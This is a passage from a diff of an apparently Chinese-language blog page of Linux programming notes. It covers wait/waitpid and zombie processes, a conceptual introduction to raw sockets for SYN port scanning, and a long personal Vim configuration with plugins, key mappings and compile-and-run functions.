class="line">在wait中，这是一个指向一个整型数据的指针，用来存放子进程退出时的状态，后来又定义了一个WIFEXITED（status)的宏来完成这项工作，这里的status就是一个指针指向的整数。</span><br><span class="line"></span><br><span class="line">&lt;4&gt;进程同步。wait可以解决进程的同步问题，通过wait（&amp;status）语句在父进程中等待子进程的返回值。</span><br><span class="line"></span><br><span class="line">&lt;5&gt;waitpid函数。其实，wait是waitpid的包装后的形式。waitpid有三个参数（pid，*status，options）</span><br><span class="line"></span><br><span class="line">pid&gt;0,只等待PID&#x3D;pid的子进程；&#x3D;0,等待同一进程组中的任何子进程；&#x3D;-1，等待任何子进程退出，此时&#x3D;wait；&lt;-1，等待指定进程组中的任何子进程</span><br><span class="line"></span><br><span class="line">options：WNOHANG|WUNTRACED，也可设为0，此时&#x3D;wait。</span><br><span class="line"></span><br><span class="line">返回值：1.正常返回子进程的PID；2.若设置了WNOHANG，可能返回0；3.error，返回-1。</span><br></pre></td></tr></table></figure>
-
-
-
-
-
+<p>创建进程使用fork()函数，<strong>执行进程使用exec函数族</strong>，<strong>终止进程则使用exit()和_exit()函数</strong></p>
+<p>总结了wait的5个知识点：</p>
+<p>&lt;1&gt;.僵尸进程：在一个进程调用了exit之后，该进程并非马上消失还留下一些参与的信息</p>
+<p>&lt;2&gt;.用wait结束僵尸进程.</p>
+<p>#include &lt;sys/types.h&gt;</p>
+<p>#include &lt;sys/wait.h&gt;</p>
+<p>pid_t wait (int *stutas)</p>
+<p>原理：进程一旦调用了wait，就立即阻塞自己，当分析到当前进程的子进程已经exit，便会收集这个子进程的信息，然后彻底销毁，如果没有找到这样的子进程，就会一直阻塞在这里，直到有一个出现。</p>
+<p>&lt;3&gt;.参数status</p>
+<p>在wait中，这是一个指向一个整型数据的指针，用来存放子进程退出时的状态，后来又定义了一个WIFEXITED（status)的宏来完成这项工作，这里的status就是一个指针指向的整数。</p>
+<p>&lt;4&gt;进程同步。wait可以解决进程的同步问题，通过wait（&amp;status）语句在父进程中等待子进程的返回值。</p>
+<p>&lt;5&gt;waitpid函数。其实，wait是waitpid的包装后的形式。waitpid有三个参数（pid，*status，options）</p>
+<p>pid&gt;0,只等待PID=pid的子进程；=0,等待同一进程组中的任何子进程；=-1，等待任何子进程退出，此时=wait；&lt;-1，等待指定进程组中的任何子进程</p>
+<p>options：WNOHANG|WUNTRACED，也可设为0，此时=wait。</p>
+<p>返回值：1.正常返回子进程的PID；2.若设置了WNOHANG，可能返回0；3.error，返回-1。</p>
 <hr>
-<h2 id="原始套接字编程"><a href="#原始套接字编程" class="headerlink" title="原始套接字编程"></a><strong>原始套接字编程</strong></h2><p>问题: 如何实现SYN扫描器扫描端口 , 比如AB两个设备要进行连接 , A通过端口发一个SYN包给B,B在收到后返回一个ACK包确认连接 , 但是在不确定B端口号时</p>
-<p>该如何进行连接 , 答: A给B的每一个端都发一个SYN包, 如果哪个有返回说明端口是开放的, TCP和UDP都无法发实现这样的连接方式 , 所以要使用原始套接字</p>
+<h2 id="原始套接字编程"><a href="#原始套接字编程" class="headerlink" title="原始套接字编程"></a><strong>原始套接字编程</strong></h2><p><strong>问题: 如何实现SYN扫描器扫描端口 , 比如AB两个设备要进行连接 , A通过端口发一个SYN包给B,B在收到后返回一个ACK包确认连接 , 但是在不确定B端口号时</strong></p>
+<p><strong>该如何进行连接 , 答: A给B的每一个端都发一个SYN包, 如果哪个有返回说明端口是开放的, TCP和UDP都无法发实现这样的连接方式 , 所以要使用原始套接字</strong></p>
 <p><strong>1、创建一个原始套接字，并设置IP头选项</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SOCKET sock; </span><br><span class="line">sock = socket(AF_INET,SOCK_RAW,IPPROTO_IP);</span><br></pre></td></tr></table></figure>
-
-<p>这里，我们设置了<strong>SOCK_RAW</strong>标志，表示我们声明的是一个原始套接字类型。创建原始套接字后，IP头就会包含在接收的数据中，如果我们设定 IP_HDRINCL 选项，那么，就需要自己来构造IP头。注意，如果设置IP_HDRINCL 选项，那么必须具有  administrator权限，</p>
-<p><strong>有两种原始套接字：</strong><br>                  一种是处理IP层及其上的数据，通过指定socket第一个参数为<strong>AF_INET来创建这种套接字</strong>。<br>                  另一种是处理数据链路层及其上的数据，通过指定socket第一个参数为PF_PACKET来创建这种套接字</p>
+<p>SOCKET sock;<br>sock = socket(AF_INET,SOCK_RAW,IPPROTO_IP); </p>
+<p><strong>这里，我们设置了SOCK_RAW标志，表示我们声明的是一个原始套接字类型。创建原始套接字后，IP头就会包含在接收的数据中，如果我们设定 IP_HDRINCL 选项，那么，就需要自己来构造IP头。注意，如果设置IP_HDRINCL 选项，那么必须具有  administrator权限，</strong></p>
+<p><strong>有两种原始套接字：</strong><br>                  <strong>一种是处理IP层及其上的数据，通过指定socket第一个参数为AF_INET来创建这种套接字。</strong><br>                  <strong>另一种是处理数据链路层及其上的数据，通过指定socket第一个参数为PF_PACKET来创建这种套接字</strong></p>
 <table>
 <thead>
 <tr>
-<th><strong>SOCK_STREAM</strong></th>
-<th><strong>面向连接的流式套接字</strong></th>
+<th>命令</th>
+<th>说明</th>
 </tr>
 </thead>
 <tbody><tr>
+<td><strong>SOCK_STREAM</strong></td>
+<td><strong>面向连接的流式套接字</strong></td>
+</tr>
+<tr>
 <td><strong>SOCK_DGRAM</strong></td>
 <td><strong>面向无连接的数据包套接字</strong></td>
 </tr>
@@ -1893,7 +1952,7 @@
 
 
 <hr>
-<h2 id="Vim编辑器开发环境设置"><a href="#Vim编辑器开发环境设置" class="headerlink" title="Vim编辑器开发环境设置"></a><strong>Vim编辑器开发环境设置</strong></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面# cat ~/.vimrc </span><br><span class="line">" Vundle Setting</span><br><span class="line"></span><br><span class="line">set nocompatible</span><br><span class="line">filetype off</span><br><span class="line">set rtp+=~/.vim/bundle/Vundle.vim</span><br><span class="line">call vundle#begin()</span><br><span class="line">Plugin 'VundleVim/Vundle.vim'</span><br><span class="line">"# Plugin 'git://github.com/scrooloose/nerdtree.git'</span><br><span class="line">"# Plugin 'git://github.com/kien/ctrlp.vim.git'</span><br><span class="line">Plugin 'scrooloose/nerdtree'</span><br><span class="line">" Let Vundle manage itself</span><br><span class="line">" Plugins</span><br><span class="line"> Plugin 'Valloric/YouCompleteMe'</span><br><span class="line"> Plugin 'scrooloose/syntastic'</span><br><span class="line"> Plugin 'bling/vim-airline'</span><br><span class="line"> Plugin 'SirVer/ultisnips'</span><br><span class="line"> Plugin 'edsono/vim-matchit'</span><br><span class="line"> Plugin 'elzr/vim-json'</span><br><span class="line"> Plugin 'honza/vim-snippets'</span><br><span class="line"> Plugin 'justinmk/vim-sneak'</span><br><span class="line"> Plugin 'kien/ctrlp.vim'</span><br><span class="line"> Plugin 'ludovicchabant/vim-lawrencium'</span><br><span class="line"> Plugin 'majutsushi/tagbar'</span><br><span class="line"> Plugin 'mhinz/vim-signify'</span><br><span class="line"> Plugin 'plasticboy/vim-markdown'</span><br><span class="line"> Plugin 'scrooloose/nerdcommenter'</span><br><span class="line"> Plugin 'sjl/gundo.vim'</span><br><span class="line"> Plugin 'tpope/vim-sleuth'</span><br><span class="line"> Plugin 'tpope/vim-surround'</span><br><span class="line"> Plugin 'tpope/vim-fugitive'</span><br><span class="line"> Plugin 'tyru/open-browser.vim'</span><br><span class="line"> Plugin 'vim-scripts/a.vim'</span><br><span class="line"></span><br><span class="line">" Color schemes</span><br><span class="line"> Plugin 'tomasr/molokai'</span><br><span class="line"> Plugin 'flazz/vim-colorschemes'</span><br><span class="line"></span><br><span class="line"> call vundle#end()</span><br><span class="line">filetype plugin indent on</span><br><span class="line"></span><br><span class="line">""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""</span><br><span class="line">" =&gt; YouCompleteMe  代码自动补全  Begin</span><br><span class="line">""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""</span><br><span class="line"></span><br><span class="line">" 自动补全配置</span><br><span class="line">set completeopt=longest,menu "让Vim的补全菜单行为与一般IDE一致(参考VimTip1228)</span><br><span class="line">autocmd InsertLeave * if pumvisible() == 0|pclose|endif "离开插入模式后自动关闭预览窗口</span><br><span class="line">inoremap &lt;expr&gt; &lt;CR&gt;       pumvisible() ? "\&lt;C-y&gt;" : "\&lt;CR&gt;" "回车即选中当前项</span><br><span class="line">"上下左右键的行为 会显示其他信息</span><br><span class="line">inoremap &lt;expr&gt; &lt;Down&gt;     pumvisible() ? "\&lt;C-n&gt;" : "\&lt;Down&gt;"</span><br><span class="line">inoremap &lt;expr&gt; &lt;Up&gt;       pumvisible() ? "\&lt;C-p&gt;" : "\&lt;Up&gt;"</span><br><span class="line">inoremap &lt;expr&gt; &lt;PageDown&gt; pumvisible() ? "\&lt;PageDown&gt;\&lt;C-p&gt;\&lt;C-n&gt;" : "\&lt;PageDown&gt;"</span><br><span class="line">inoremap &lt;expr&gt; &lt;PageUp&gt;   pumvisible() ? "\&lt;PageUp&gt;\&lt;C-p&gt;\&lt;C-n&gt;" : "\&lt;PageUp&gt;"</span><br><span class="line">"youcompleteme  默认tab  s-tab 和自动补全冲突</span><br><span class="line">"let g:ycm_key_list_select_completion=['&lt;c-n&gt;']</span><br><span class="line">"let g:ycm_key_list_select_completion = ['&lt;Down&gt;']</span><br><span class="line">"let g:ycm_key_list_previous_completion=['&lt;c-p&gt;']</span><br><span class="line">"let g:ycm_key_list_previous_completion = ['&lt;Up&gt;']</span><br><span class="line">let g:ycm_confirm_extra_conf=0 "关闭加载.ycm_extra_conf.py提示</span><br><span class="line">let g:ycm_collect_identifiers_from_tags_files=1 " 开启 YCM 基于标签引擎</span><br><span class="line">let g:ycm_min_num_of_chars_for_completion=1 " 从第2个键入字符就开始罗列匹配项</span><br><span class="line">let g:ycm_cache_omnifunc=0 " 禁止缓存匹配项,每次都重新生成匹配项</span><br><span class="line">let g:ycm_seed_identifiers_with_syntax=1 " 语法关键字补全</span><br><span class="line">nnoremap &lt;F5&gt; :YcmForceCompileAndDiagnostics&lt;CR&gt; "force recomile with syntastic</span><br><span class="line">"nnoremap &lt;leader&gt;lo :lopen&lt;CR&gt; "open locationlist</span><br><span class="line">"nnoremap &lt;leader&gt;lc :lclose&lt;CR&gt; "close locationlist</span><br><span class="line">inoremap &lt;leader&gt;&lt;leader&gt; &lt;C-x&gt;&lt;C-o&gt;</span><br><span class="line">"在注释输入中也能补全</span><br><span class="line">let g:ycm_complete_in_comments = 1</span><br><span class="line">"在字符串输入中也能补全</span><br><span class="line">let g:ycm_complete_in_strings = 1</span><br><span class="line">"注释和字符串中的文字也会被收入补全</span><br><span class="line">let g:ycm_collect_identifiers_from_comments_and_strings = 0</span><br><span class="line">nnoremap &lt;leader&gt;jd :YcmCompleter GoToDefinitionElseDeclaration&lt;CR&gt; " 跳转到定义处</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">"为了Python3的第三方库安装Jedi插件</span><br><span class="line">Plugin 'davidhalter/jedi-vim'</span><br><span class="line">"===============================Jedi==================================</span><br><span class="line">if has('python3')</span><br><span class="line">let g:loaded_youcompleteme = 1 " 判断如果是python3的话，就禁用ycmd。</span><br><span class="line">let g:jedi#force_py_version = 3</span><br><span class="line">let g:pymode_python = 'python3'</span><br><span class="line">endif</span><br><span class="line">"===============================Jedi===================================</span><br><span class="line"></span><br><span class="line">""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""</span><br><span class="line">" =&gt; YouCompleteMe  代码自动补全  End</span><br><span class="line">""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""</span><br><span class="line"></span><br><span class="line">" 设置配色方案</span><br><span class="line">" colorscheme torte</span><br><span class="line">" colorscheme murphy</span><br><span class="line">" colorscheme desert </span><br><span class="line"></span><br><span class="line">"字体 </span><br><span class="line">"if (has("gui_running")) </span><br><span class="line">"   set guifont=Bitstream\ Vera\ Sans\ Mono\ 10 </span><br><span class="line">"endif </span><br><span class="line"></span><br><span class="line">""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""</span><br><span class="line">" 显示相关  </span><br><span class="line">""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""</span><br><span class="line">set shortmess=atI   " 启动的时候不显示那个援助乌干达儿童的提示  </span><br><span class="line">"winpos 5 5          " 设定窗口位置  </span><br><span class="line">"set lines=40 columns=155    " 设定窗口大小  </span><br><span class="line">set go=             " 不要图形按钮  </span><br><span class="line">"color asmanian2     " 设置背景主题  </span><br><span class="line">"set guifont=Courier_New:h10:cANSI   " 设置字体  </span><br><span class="line">syntax on           " 语法高亮  </span><br><span class="line">autocmd InsertLeave * se nocul  " 用浅色高亮当前行  </span><br><span class="line">autocmd InsertEnter * se cul    " 用浅色高亮当前行  </span><br><span class="line">set ruler           " 显示标尺  </span><br><span class="line">set showcmd         " 输入的命令显示出来，看的清楚些  </span><br><span class="line">set cmdheight=1     " 命令行（在状态行下）的高度，设置为1  </span><br><span class="line">set whichwrap+=&lt;,&gt;,h,l   " 允许backspace和光标键跨越行边界(不建议)  </span><br><span class="line">set scrolloff=3     " 光标移动到buffer的顶部和底部时保持3行距离  </span><br><span class="line">set novisualbell    " 不要闪烁(不明白)  </span><br><span class="line">set statusline=%F%m%r%h%w\ [FORMAT=%&#123;&amp;ff&#125;]\ [TYPE=%Y]\ [POS=%l,%v][%p%%]\ %&#123;strftime(\"%d/%m/%y\ -\ %H:%M\")&#125;   "状态行显示的内容  </span><br><span class="line">set laststatus=1    " 启动显示状态行(1),总是显示状态行(2)  </span><br><span class="line">"set foldenable      " 允许折叠  </span><br><span class="line">set foldmethod=manual   " 手动折叠  </span><br><span class="line">"set background=dark "背景使用黑色 </span><br><span class="line">" 显示中文帮助</span><br><span class="line">if version &gt;= 603</span><br><span class="line">    set helplang=cn</span><br><span class="line">    set encoding=utf-8</span><br><span class="line">endif</span><br><span class="line"></span><br><span class="line">"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""</span><br><span class="line">"""""新文件标题</span><br><span class="line">""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""</span><br><span class="line">"新建.c,.h,.sh,.java文件，自动插入文件头 </span><br><span class="line">autocmd BufNewFile *.cpp,*.[ch],*.sh,*.java exec ":call SetTitle()" </span><br><span class="line">""定义函数SetTitle，自动插入文件头 </span><br><span class="line">func SetTitle() </span><br><span class="line">    "如果文件类型为.sh文件 </span><br><span class="line">    if &amp;filetype == 'sh' </span><br><span class="line">    call setline(1,"\#########################################################################") </span><br><span class="line">    call append(line("."), "\# File Name: ".expand("%")) </span><br><span class="line">    call append(line(".")+1, "\# Author: Function_Dou") </span><br><span class="line">    call append(line(".")+2, "\# mail: NOT") </span><br><span class="line">    call append(line(".")+3, "\# Created Time: ".strftime("%c")) </span><br><span class="line">    call append(line(".")+4, "\#########################################################################") </span><br><span class="line">    call append(line(".")+5, "\#!/bin/bash") </span><br><span class="line">    call append(line(".")+6, "") </span><br><span class="line">    else </span><br><span class="line">    call setline(1, "/*************************************************************************") </span><br><span class="line">    call append(line("."), "    &gt; File Name: ".expand("%")) </span><br><span class="line">    call append(line(".")+1, "    &gt; Author: Function_Dou") </span><br><span class="line">    call append(line(".")+2, "    &gt; Mail: NOT") </span><br><span class="line">    call append(line(".")+3, "    &gt; Created Time: ".strftime("%c")) </span><br><span class="line">    call append(line(".")+4, " ************************************************************************/") </span><br><span class="line">    call append(line(".")+5, "")</span><br><span class="line">    endif</span><br><span class="line">    if &amp;filetype == 'cpp'</span><br><span class="line">    call append(line(".")+6, "#include &lt;stdio.h&gt;")</span><br><span class="line">   "call append(line(".")+7, " ")</span><br><span class="line">   "call append(line(".")+8, "")</span><br><span class="line">    endif</span><br><span class="line">    if &amp;filetype == 'c'</span><br><span class="line">    call append(line(".")+6, "#include &lt;stdio.h&gt;")</span><br><span class="line">    call append(line(".")+7, "")</span><br><span class="line">    endif</span><br><span class="line">    "    if &amp;filetype == 'java'</span><br><span class="line">    "        call append(line(".")+6,"public class ".expand("%"))</span><br><span class="line">    "        call append(line(".")+7,"")</span><br><span class="line">    "    endif</span><br><span class="line">    "新建文件后，自动定位到文件末尾</span><br><span class="line">    autocmd BufNewFile * normal G</span><br><span class="line">endfunc </span><br><span class="line"></span><br><span class="line">""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""</span><br><span class="line">"键盘命令</span><br><span class="line">""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""</span><br><span class="line">nmap &lt;leader&gt;w :w!&lt;cr&gt;</span><br><span class="line">nmap &lt;leader&gt;f :find&lt;cr&gt;</span><br><span class="line">" 映射全选+复制 ctrl+a</span><br><span class="line">map &lt;C-A&gt; ggVGY</span><br><span class="line">map! &lt;C-A&gt; &lt;Esc&gt;ggVGY</span><br><span class="line">map &lt;F12&gt; gg=G</span><br><span class="line">" 选中状态下 Ctrl+c 复制</span><br><span class="line">vmap &lt;C-c&gt; "+y</span><br><span class="line">"去空行  </span><br><span class="line">nnoremap &lt;F4&gt; :g/^\s*$/d&lt;CR&gt; </span><br><span class="line">"比较文件  </span><br><span class="line">nnoremap &lt;C-F4&gt; :vert diffsplit </span><br><span class="line">"新建标签  </span><br><span class="line">map &lt;M-F4&gt; :tabnew&lt;CR&gt;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">" vim-scripts 中的插件 "</span><br><span class="line">Plugin 'taglist.vim'</span><br><span class="line">"ctags 配置:F3快捷键显示程序中的各种tags，包括变量和函数等。</span><br><span class="line">map &lt;F3&gt; :TlistToggle&lt;CR&gt;</span><br><span class="line">let Tlist_Use_Right_Window=1</span><br><span class="line">let Tlist_Show_One_File=1</span><br><span class="line">let Tlist_Exit_OnlyWindow=1</span><br><span class="line">let Tlist_WinWidt=25</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">"列出当前目录文件  </span><br><span class="line">"map &lt;F2&gt; :tabnew .&lt;CR&gt;  </span><br><span class="line">"打开树状文件目录  </span><br><span class="line">"map &lt;C-F2&gt; \be  </span><br><span class="line"></span><br><span class="line">""将F3设置为开关NERDTree的快捷键</span><br><span class="line">"map &lt;F2&gt; :NERDTreeMirror&lt;CR&gt;</span><br><span class="line">map &lt;F2&gt; :NERDTreeToggle .&lt;CR&gt;</span><br><span class="line">""修改树的显示图标</span><br><span class="line">let g:NERDTreeDirArrowExpandable = '+'</span><br><span class="line">let g:NERDTreeDirArrowCollapsible = '-'</span><br><span class="line">""窗口位置</span><br><span class="line">let g:NERDTreeWinPos='left'</span><br><span class="line">""窗口尺寸</span><br><span class="line">let g:NERDTreeSize=30</span><br><span class="line">""窗口是否显示行号</span><br><span class="line">let g:NERDTreeShowLineNumbers=1</span><br><span class="line">""不显示隐藏文件</span><br><span class="line">let g:NERDTreeHidden=0</span><br><span class="line">""打开vim时如果没有文件自动打开NERDTree</span><br><span class="line">"autocmd vimenter * if !argc()|NERDTree|endif</span><br><span class="line">""当NERDTree为剩下的唯一窗口时自动关闭</span><br><span class="line">"autocmd bufenter * if (winnr("$") == 1 &amp;&amp; exists("b:NERDTree") &amp;&amp; b:NERDTree.isTabTree()) | q | endif</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">"C，C++ 按F5编译运行</span><br><span class="line">map &lt;F5&gt; :call CompileRunGcc()&lt;CR&gt;</span><br><span class="line">func! CompileRunGcc()</span><br><span class="line">    exec "w"</span><br><span class="line">    if &amp;filetype == 'c'</span><br><span class="line">    exec "!g++ % -o %&lt;"</span><br><span class="line">    exec "! ./%&lt;"</span><br><span class="line">    elseif &amp;filetype == 'cpp'</span><br><span class="line">    exec "!g++ % -o %&lt;"</span><br><span class="line">    exec "! ./%&lt;"</span><br><span class="line">    elseif &amp;filetype == 'java' </span><br><span class="line">    exec "!javac %" </span><br><span class="line">    exec "!java %&lt;"</span><br><span class="line">    elseif &amp;filetype == 'sh'</span><br><span class="line">    :!./%</span><br><span class="line">    elseif &amp;filetype == 'py'</span><br><span class="line">    exec "!python %"</span><br><span class="line">    exec "!python %&lt;"</span><br><span class="line">    endif</span><br><span class="line">endfunc</span><br><span class="line">"C,C++的调试</span><br><span class="line">map &lt;F8&gt; :call Rungdb()&lt;CR&gt;</span><br><span class="line">func! Rungdb()</span><br><span class="line">    exec "w"</span><br><span class="line">    exec "!g++ % -g -o %&lt;"</span><br><span class="line">    exec "!gdb ./%&lt;"</span><br><span class="line">endfunc</span><br><span class="line"></span><br><span class="line">""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""</span><br><span class="line">""实用设置</span><br><span class="line">"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""</span><br><span class="line">" 设置当文件被改动时自动载入</span><br><span class="line">set autoread</span><br><span class="line">" quickfix模式</span><br><span class="line">autocmd FileType c,cpp map &lt;buffer&gt; &lt;leader&gt;&lt;space&gt; 